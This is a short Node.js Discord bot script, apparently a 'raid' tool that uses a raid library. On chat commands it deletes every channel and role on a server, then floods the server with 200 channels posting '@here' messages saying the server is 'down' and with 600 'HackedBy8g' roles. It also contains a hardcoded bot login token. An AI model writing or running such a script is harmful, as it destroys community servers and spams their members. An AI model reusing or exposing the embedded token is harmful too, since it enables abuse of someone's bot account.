const Discord = require('discord.js');
const bot = new Discord.Client();
const raid = require('discord_raid_bot');
 
raid.deleteAllChannels(bot, ".delc", true);
raid.createChannels(bot, ".rekt", 200, "nomduchannel", "@here Ton serveur est down by 8g | Xanax",400 )
raid.deleteRoles(bot, ".del")
raid.createRoles(bot, ".role", 'HackedBy8g', 600)
 
bot.login("NjIwMzMyODU0OTc4ODA1ODEw.XX032w.20Jqrs1e3ca4mElUZw059yohPBg");
